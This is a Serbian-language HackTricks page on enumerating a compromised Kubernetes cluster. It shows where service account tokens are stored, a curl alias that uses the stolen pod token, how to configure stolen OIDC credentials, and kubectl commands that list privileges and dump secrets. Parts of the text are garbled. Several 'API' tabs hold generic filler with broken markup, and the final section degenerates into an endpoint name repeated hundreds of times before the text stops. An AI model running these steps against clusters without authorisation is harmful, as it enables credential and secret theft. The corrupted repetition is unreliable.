# Enumeracija Kubernetesa

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Ekspert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Kubernetes Tokeni

Ako ste kompromitovali pristup mašini, korisnik može imati pristup nekoj Kubernetes platformi. Token se obično nalazi u fajlu na koji ukazuje **env var `KUBECONFIG`** ili **unutar `~/.kube`**.

U ovom folderu možete pronaći konfiguracione fajlove sa **tokenima i konfiguracijama za povezivanje sa API serverom**. Takođe u ovom folderu možete pronaći folder keša sa prethodno dobijenim informacijama.

Ako ste kompromitovali pod unutar Kubernetes okruženja, postoje druga mesta gde možete pronaći tokene i informacije o trenutnom K8 okruženju:

### Tokeni Servisnog Računa

Pre nego što nastavite, ako ne znate šta je servis u Kubernetesu, predlažem vam da **pratite ovaj link i pročitate bar informacije o arhitekturi Kubernetesa**.

Preuzeto iz Kubernetes [dokumentacije](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_“Kada kreirate pod, ako ne navedete servisni račun, automatski mu je dodeljen_ podrazumevani _servisni račun u istom namespace-u.”_

**ServiceAccount** je objekat upravljan od strane Kubernetesa i koristi se za pružanje identiteta procesima koji se izvršavaju u podu.\
Svaki servisni račun ima povezan tajni ključ i ovaj ključ sadrži nosioc tokena. Ovo je JSON Web Token (JWT), metoda za bezbedno predstavljanje tvrdnji između dve strane.

Obično **jedan** od direktorijuma:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

sadrži fajlove:

* **ca.crt**: To je ca sertifikat za proveru komunikacija sa Kubernetesom
* **namespace**: Označava trenutni namespace
* **token**: Sadrži **servisni token** trenutnog poda.

Sada kada imate token, možete pronaći API server unutar environment varijable **`KUBECONFIG`**. Za više informacija pokrenite `(env | set) | grep -i "kuber|kube`**`"`**

Token servisnog računa je potpisan ključem koji se nalazi u fajlu **sa.key** i validiran od strane **sa.pub**.

Podrazumevana lokacija na **Kubernetesu**:

* /etc/kubernetes/pki

Podrazumevana lokacija na **Minikube-u**:

* /var/lib/localkube/certs

### Vrući Podovi

_**Vrući podovi su**_ podovi koji sadrže privilegovani token servisnog računa. Privilegovani token servisnog računa je token koji ima dozvolu da obavlja privilegovane zadatke kao što su listanje tajni, kreiranje podova, itd.

## RBAC

Ako ne znate šta je **RBAC**, **pročitajte ovaj odeljak**.

## Enumeracija CheatSheet

Da biste enumerisali K8s okruženje, potrebno vam je nekoliko stvari:

* **Validan autentifikacioni token**. U prethodnom odeljku videli smo gde tražiti korisnički token i token servisnog računa.
* **Adresa (**_**https://host:port**_**) Kubernetes API-ja**. Ovo se obično može pronaći u environment varijablama i/ili u kube konfiguracionom fajlu.
* **Opciono**: **ca.crt za verifikaciju API servera**. Ovo se može pronaći na istim mestima gde se nalazi i token. Ovo je korisno za verifikaciju sertifikata API servera, ali koristeći `--insecure-skip-tls-verify` sa `kubectl` ili `-k` sa `curl` nećete morati koristiti ovo.

Sa ovim detaljima možete **enumerisati Kubernetes**. Ako je **API** iz nekog razloga **dostupan** preko **Interneta**, možete jednostavno preuzeti te informacije i enumerisati platformu sa vaše mašine.

Međutim, obično je **API server unutar internog mrežnog sistema**, stoga ćete morati **kreirati tunel** preko kompromitovane mašine da biste mu pristupili sa vaše mašine, ili možete **uploadovati** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binarni fajl, ili koristiti **`curl/wget/bilo šta`** da biste izvršili sirove HTTP zahteve ka API serveru.

### Razlike između `list` i `get` glagola

Sa **`get`** dozvolama možete pristupiti informacijama specifičnih resursa (_`describe` opcija u `kubectl`_) API-ja:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Ako imate dozvolu **`list`**, dozvoljeno vam je da izvršite API zahtev za listanje vrste resursa (_`get` opcija u `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Ako imate dozvolu **`watch`**, možete izvršiti API zahteve za praćenje resursa:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Otvaraju streaming konekciju koja vam vraća kompletan manifest Deployment-a svaki put kada se promeni (ili kada se kreira novi).

{% hint style="danger" %}
Sledeće `kubectl` komande pokazuju samo kako da se navedu objekti. Ako želite da pristupite podacima, treba koristiti `describe` umesto `get`.
{% endhint %}

### Korišćenje curl-a

Iznutra u podu možete koristiti nekoliko env promenljivih:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Pod podrazumevano može **pristupiti** **kube-api serveru** u domenu **`kubernetes.default.svc`** i možete videti kube mrežu u **`/etc/resolv.config`** gde ćete pronaći adresu kubernetes DNS servera (".1" istog opsega je kube-api endpoint).
{% endhint %}

### Korišćenje kubectl-a

Imajući token i adresu API servera, koristite kubectl ili curl za pristupanje kako je naznačeno ovde:

Podrazumevano, APISERVER komunicira sa `https://` šemom
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> ako nema `https://` u url-u, možete dobiti grešku poput Loš zahtev.

Možete pronaći [**zvanični kubectl cheatsheet ovde**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Cilj sledećih sekcija je da predstavi na uređen način različite opcije za enumeraciju i razumevanje novog K8s-a do kojeg ste dobili pristup.

Da biste pronašli HTTP zahtev koji `kubectl` šalje, možete koristiti parametar `-v=8`

#### MitM kubectl - Proksifikacija kubectl-a
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Trenutna Konfiguracija

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Ako ste uspeli da ukradete neke korisničke podatke, možete **lokalno ih konfigurisati** koristeći nešto slično:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Dobijanje podržanih resursa

Sa ovim informacijama ćete znati sve usluge koje možete da nabrojite

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Dobijanje trenutnih privilegija

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kubelet API**: Proverite da li je Kubelet API dostupan i da li možete pristupiti informacijama o čvorovima i njihovim resursima.

2. **Kubernetes API server**: Istražite Kubernetes API server kako biste identifikovali dostupne endpointe i resurse.

3. **API endpointi**: Pokušajte da pristupite različitim API endpointima kako biste saznali više o konfiguraciji klastera i resursima.

4. **Kubernetes servisi**: Ispitajte Kubernetes servise kako biste identifikovali moguće ranjivosti ili konfiguracijske greške.

5. **Kubernetes RBAC**: Proverite RBAC (Role-Based Access Control) politike kako biste razumeli ko ima pristup određenim resursima u klasteru.

6. **Kubernetes objekti**: Istražite Kubernetes objekte poput podova, servisa, i konfiguracija kako biste bolje razumeli strukturu klastera.

Prilikom enumeracije API-ja, važno je pažljivo pristupiti informacijama i izbegavati neovlašćen pristup ili manipulaciju resursima. 

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Još jedan način da proverite svoje privilegije je korišćenjem alata: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Više informacija o **Kubernetes RBAC** možete pronaći u:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Kada saznate koje privilegije** imate, proverite sledeću stranicu da biste saznali **da li ih možete zloupotrebiti** radi eskalacije privilegija:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Dobijanje drugih uloga

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kubelet API**: Proverite da li je Kubelet API dostupan i da li možete pristupiti informacijama o čvorovima i kontejnerima.

2. **Kubernetes API server**: Istražite Kubernetes API server kako biste identifikovali resurse, servise i ostale objekte u klasteru.

3. **API endpointi**: Proučite sve dostupne API endpointe kako biste otkrili potencijalne tačke za napad.

4. **Autentikacija i autorizacija**: Proverite postavke autentikacije i autorizacije na API-ju kako biste identifikovali eventualne slabosti.

5. **API tokeni**: Tražite nezaštićene API tokene koji bi mogli omogućiti neovlašćen pristup klasteru.

6. **API verzije**: Istražite podržane verzije API-ja kako biste identifikovali eventualne ranjivosti poznate u starijim verzijama.

Prilikom enumeracije API-ja, važno je pažljivo dokumentovati sve pronađene informacije i potencijalne ranjivosti radi dalje analize i ispravki. 

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
### Dobijanje imenskih prostora

Kubernetes podržava **višestruke virtuelne klaster** podržane istim fizičkim klasterom. Ovi virtuelni klasteri se nazivaju **imenski prostori**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija Kubernetes API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je prvo identifikovati sve dostupne API-je kako biste mogli da analizirate njihovu konfiguraciju i proverite da li postoji neka ranjivost.

Evo nekoliko tehnika koje možete koristiti za enumeraciju Kubernetes API-ja:

1. **Kubelet API**: Proverite da li je Kubelet API dostupan na portu 10250 ili 10255 na svakom čvoru u klasteru.

2. **Kubernetes API server**: Identifikujte Kubernetes API server koji je obično dostupan na portu 6443 ili 443.

3. **Kubernetes Dashboard**: Ako je Kubernetes Dashboard omogućen, možete ga koristiti za interaktivno istraživanje klastera.

4. **Kube API server proxy**: Proverite da li je Kube API server proxy dostupan na portu 8001.

5. **Etcd baza podataka**: Etcd je često korišćen za skladištenje konfiguracija klastera, pa je važno proveriti da li je dostupan i da li su postavke bezbedne.

6. **Kube DNS**: Identifikujte Kube DNS servis koji se koristi za DNS upite unutar klastera.

Prilikom enumeracije API-ja, važno je pažljivo analizirati svaki pronađeni API i proveriti da li postoji neka ranjivost koja bi mogla biti iskorišćena za napad na klaster. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Dobijanje tajni

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeracija API-ja

Prilikom testiranja bezbednosti Kubernetes klastera, važno je detaljno istražiti dostupne API-jeve kako biste identifikovali potencijalne ranjivosti. Evo nekoliko tehnika koje možete koristiti za enumeraciju API-ja:

1. **Kubelet API**: Proverite da li je Kubelet API dostupan na portu 10250 ili 10255 na čvorovima klastera. Možete koristiti alat kao što je `kubeletctl` za interakciju sa API-jem.

2. **Kubernetes API server**: Istražite Kubernetes API server koji je obično dostupan na portu 6443. Možete koristiti alate poput `kubectl` ili `kube-apiserver` za interakciju sa API-jem.

3. **API endpointi**: Istražite različite API endpointe kao što su `/api`, `/apis`, `/healthz`, `/version`, `/metrics`, `/logs`, `/exec`, `/attach`, `/portforward`, `/run`, `/runningpods`, `/pods`, `/nodes`, `/namespaces`, `/services`, `/deployments`, `/replicasets`, `/jobs`, `/cronjobs`, `/configmaps`, `/secrets`, `/ingresses`, `/persistentvolumes`, `/storageclasses`, `/events`, `/componentstatuses`, `/customresourcedefinitions`, `/apiservices`, `/tokenreviews`, `/subjectaccessreviews`, `/selfsubjectaccessreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, `/selfsubjectrulesreviews`, 